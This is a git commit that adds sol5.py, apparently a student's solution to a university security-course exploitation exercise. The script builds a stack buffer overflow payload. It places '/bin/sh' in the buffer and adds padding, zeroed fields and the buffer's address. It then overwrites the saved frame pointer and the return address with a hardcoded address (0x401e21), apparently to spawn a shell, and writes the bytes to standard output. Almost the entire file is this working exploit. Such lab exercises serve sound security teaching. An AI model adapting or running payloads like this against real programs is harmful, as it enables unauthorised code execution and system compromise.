b9bc4488563daa62354000a326d200dc98c0e83e
cbcald <cbcald@umich.edu>
2026-03-24 15:43:16 -0400

    Update sol5.py

--- sol5.py
+++ sol5.py
@@ -1,3 +1,17 @@
 #!/usr/bin/env python3
 
 import sys
+
+rbp = 0x7ffffff6b4d0
+buf_addr = rbp - 0x22  
+
+payload  = b'/bin/sh\x00'                 
+payload += b'A' * 2                        
+payload += (0).to_bytes(8, 'little')       
+payload += (0).to_bytes(8, 'little')       
+payload += buf_addr.to_bytes(8, 'little')  
+payload += b'B' * 8                        
+payload += (0x401e21).to_bytes(8, 'little')
+
+sys.stdout.buffer.write(payload)
+
